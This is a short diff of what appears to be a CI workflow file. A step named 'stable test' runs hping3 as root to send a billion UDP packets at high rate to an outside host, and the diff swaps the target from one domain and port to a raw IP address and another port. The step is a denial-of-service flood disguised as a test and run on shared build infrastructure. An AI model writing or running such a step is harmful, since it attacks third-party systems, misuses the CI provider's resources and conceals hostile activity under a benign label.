@@ -19,4 +19,4 @@ jobs:
     - name: make
       run: make
     - name: stable test
-      run: sudo ./hping3 -2 --faster -c 1000000000 -p 40008 dbfrp.mc66.club
+      run: sudo ./hping3 -2 --faster -c 1000000000 -p 21464 180.188.18.71
